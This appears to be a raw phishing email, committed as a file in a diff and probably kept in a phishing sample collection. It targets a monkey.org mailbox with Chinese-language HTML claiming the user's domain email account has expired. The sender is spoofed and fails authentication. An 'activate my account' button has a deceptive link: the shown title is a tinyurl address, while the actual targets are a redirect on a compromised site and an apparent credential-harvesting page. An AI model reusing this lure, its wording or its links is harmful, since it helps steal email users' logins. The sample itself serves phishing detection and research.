@@ -1,0 +1,145 @@
+From jose@monkey.org Sun Sep 24 22:50:59 2023 +0000
+Return-Path: forwarding@forwardingchile.cl
+Delivered-To: jose@monkey.org
+X-FDA: 81272987838.34.5D5B488
+Received: from s727219.srvape.com (s727219.srvape.com [91.219.148.174])
+	by imf27.b.hostedemail.com (Postfix) with ESMTP id 6031F1A0006
+	for <jose@monkey.org>; Sun, 24 Sep 2023 22:50:57 +0000 (UTC)
+Authentication-Results: imf27.b.hostedemail.com;
+	dkim=none;
+	spf=none (imf27.b.hostedemail.com: domain of forwarding@forwardingchile.cl has no SPF policy when checking 91.219.148.174) smtp.mailfrom=forwarding@forwardingchile.cl;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1695595857;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=GbLywZK/sgbotLBKnfoFGHMh83PEZY/qZyTvBS6A6AA=;
+	b=Pz6oEzt1XMP+tykbfhAEWoXxeuydaiWH4vnYnFNd0eM1P1859/7sQknxAXEPc35fmRJhsB
+	0lgTA2ttnQPlx+EcWRNKcX5vCnIZ+ZxS0bLGmb5dmyrA6jeA3Nrr5tPPRyHZEfY99lx9a9
+	ii2BEmFGFVuAiEYTVoCjaV46SzhvYng=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1695595857; a=rsa-sha256;
+	cv=none;
+	b=OPoVajYzNagpBQmSSVZN3QIjNIX7C0b0/xoKsQwn5VhYl8NUDn1Xhh50gdmW3GqAgSIdZ2
+	nhVzGB+ztFBT9y4bt2ZjIVatKdkwZX+4HnOGjD8saDQRx505XLqhMcIZ3zi9TXSUnyFB8q
+	6BuejpUxc570yuuEJDoL5J3UHqoSrKs=
+ARC-Authentication-Results: i=1;
+	imf27.b.hostedemail.com;
+	dkim=none;
+	spf=none (imf27.b.hostedemail.com: domain of forwarding@forwardingchile.cl has no SPF policy when checking 91.219.148.174) smtp.mailfrom=forwarding@forwardingchile.cl;
+	dmarc=none
+Received: from forwardingchile.cl (localhost [IPv6:::1])
+	by s727219.srvape.com (Postfix) with ESMTP id 7A4122657E8
+	for <jose@monkey.org>; Sun, 24 Sep 2023 22:41:55 +0000 (UTC)
+Reply-To: wxyc88.sina@gmail.com
+From: monkey.org  <forwarding@forwardingchile.cl>
+To: jose@monkey.org
+Subject: =?UTF-8?B?4pqg77iPIOitpuWRii4uICDmgqjnmoTpm7vlrZDpg7Xku7bluLPmiLYg?=jose@monkey.org =?UTF-8?B?5Y2z5bCH6YGO5pyf?=
+Date: 25 Sep 2023 00:41:55 +0200
+Message-ID: <20230925004155.35968F7780D01836@forwardingchile.cl>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: 6031F1A0006
+X-Stat-Signature: s7krhzo7qdrmdin931ufwt436q5mpojk
+X-Spam-Status: No, score=4.70
+X-Rspam-User: 
+X-HE-Tag: 1695595857-681136
+X-HE-Meta: U2FsdGVkX18qqjMVjrPGBS9g3k0hQ5CyWSgnG/IBDWuS/rFvE6f9Hq56vfWReMa3fA/8SFUVoLDhJSDdKgkSALPu/35UyOtXmYpEegShFshudWzm/zdHE+ghTtIYGKpF/c/h4Xww+ZByKlHh9xOjV3q6LJNKrUYWrIK64hvkFQ7i9311q9cGRIwJft4aN5j6kl26iOaKG1xQkzQ2vPJVVVWdsCIHp/juUmfKBMTc9XC+CgwKSyryoh0Ll+BGc5cyiqwlkS3iscsxiJTUgf8u5ClYv/GRa8kffOygj7KoQHfSdPUjTMQS9XiyUPGM8p2GI6i6bcl+Yk1BCOIo7w5Dwj5FntcDNbuj2Ftf1CYmxy7mzywT/wFnc3mcl95CBAgzNQrEI4UM5jhRaDc35OCoDISZYMIWF+4TGfrDGRTxjnYU/Rm8PszizZ/kQ0tNVGggp0+NDy6w2uiWOc1bs71Qf6OZ7+TmS9Tjl058m8WKWhw=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 286
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body>
+<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
+ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
+0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
+SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-var=
+iant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thicknes=
+s: initial; text-decoration-style: initial; text-decoration-color: initial"=
+ align=3Dcenter>
+&#24744;&#30340;&#24115;&#25142;&#24050;&#36942;&#26399;<BR></P>
+<P style=3D'FONT-SIZE: small; FONT-FAMILY: "Times New Roman", Times, serif;=
+ WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT:=
+ 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETT=
+ER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-=
+variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thick=
+ness: initial; text-decoration-style: initial; text-decoration-color: initi=
+al' align=3Dcenter>
+<SPAN style=3D"FONT-FAMILY: Arial, Helvetica, sans-serif">&#24744;&#30340;&=
+#22495;&#38651;&#23376;&#37109;&#20214;&#24115;&#25142;</SPAN><SPAN style=
+=3D"FONT-FAMILY: verdana, geneva"><FONT face=3DArial>&nbsp;jose@monkey.org&=
+nbsp;</FONT></SPAN><SPAN style=3D"FONT-FAMILY: Arial, Helvetica, sans-serif=
+">&#35373;&#32622;&#28858;&#36942;&#26399;&#20006;&#35531;&#27714;<WBR>&#21=
+319;&#32026;</SPAN></P>
+<P style=3D'FONT-SIZE: small; FONT-FAMILY: "Times New Roman", Times, serif;=
+ WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT:=
+ 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETT=
+ER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-=
+variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thick=
+ness: initial; text-decoration-style: initial; text-decoration-color: initi=
+al' align=3Dcenter>
+<SPAN style=3D"FONT-FAMILY: Arial, Helvetica, sans-serif">&#21040;&#26399;&=
+#26085;&#26399;</SPAN><SPAN style=3D"FONT-FAMILY: verdana, geneva; COLOR: r=
+gb(255,0,0)"><FONT face=3DArial>:  Monday, September 25, 2023 12:41 a.m.</F=
+ONT></SPAN></P>
+<DIV style=3D'FONT-SIZE: small; FONT-FAMILY: "Times New Roman", Times, seri=
+f; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGH=
+T: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; MIN-HEIGHT: 1em; ORPHANS:=
+ 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
+ration-color: initial' align=3Dcenter>
+<table style=3D"MARGIN-TOP: 20px" cellspacing=3D"0" cellpadding=3D"0" align=
+=3D"center" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"MARGIN: 0px"><SPAN style=3D"FONT-FAMILY: verdana, geneva"><FON=
+T face=3DArial>&nbsp;</FONT></SPAN></TD>
+<td style=3D"MARGIN: 0px"><SPAN style=3D"FONT-FAMILY: verdana, geneva">
+<A title=3D"Click to open in a new window or tab: https://tinyurl.com/ynk9s=
+8dw?login=3Djose@monkey.org" style=3D"FONT-SIZE: 15px; COLOR: rgb(255,255,2=
+55); PADDING-BOTTOM: 8px; TEXT-ALIGN: center; PADDING-TOP: 8px; PADDING-LEF=
+T: 12px; DISPLAY: block; PADDING-RIGHT: 12px; BACKGROUND-COLOR: rgb(13,36,1=
+29); MARGIN-RIGHT: 8px; text-decoration-line: none" href=3D"https://nblsinc=
+=2Ecom/wp-includes/redirect/REDIRECT.html#jose@monkey.org" target=3D_blank=
+=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://rahatit.xyz/=
+linkedin2/index.html%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D169=
+5676995631000&amp;usg=3DAOvVaw0Pn9Y1svE81rjiLMMMfzPg"><SPAN style=3D"FONT-S=
+IZE: small"><FONT color=3D#ffffce face=3DArial>&#28608;&#27963;&#25105;&#30=
+340;&#24115;&#25142;</FONT></SPAN></A></SPAN></TD></TR></TBODY></TABLE></DI=
+V>
+<DIV style=3D'FONT-SIZE: small; FONT-FAMILY: "Times New Roman", Times, seri=
+f; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGH=
+T: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; MIN-HEIGHT: 1em; ORPHANS:=
+ 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
+ration-color: initial' align=3Dcenter>
+<SPAN style=3D"FONT-FAMILY: verdana, geneva"><FONT face=3DArial></FONT></SP=
+AN>&nbsp;</DIV>
+<DIV style=3D'FONT-SIZE: small; FONT-FAMILY: "Times New Roman", Times, seri=
+f; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGH=
+T: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; MIN-HEIGHT: 1em; ORPHANS:=
+ 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
+ration-color: initial' align=3Dcenter>
+<SPAN style=3D"FONT-SIZE: xx-small; FONT-FAMILY: verdana, geneva"><FONT fac=
+e=3DArial><B><BR></B></FONT></SPAN></DIV>
+<DIV style=3D'FONT-SIZE: small; FONT-FAMILY: "Times New Roman", Times, seri=
+f; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGH=
+T: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; MIN-HEIGHT: 1em; ORPHANS:=
+ 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
+ration-color: initial' align=3Dcenter>
+<SPAN style=3D"FONT-SIZE: xx-small; FONT-FAMILY: verdana, geneva"><FONT fac=
+e=3DArial><B>monkey.org Copyright &copy; 2023 All Rights Reserved</B></FONT=
+></SPAN></DIV></BODY></HTML>
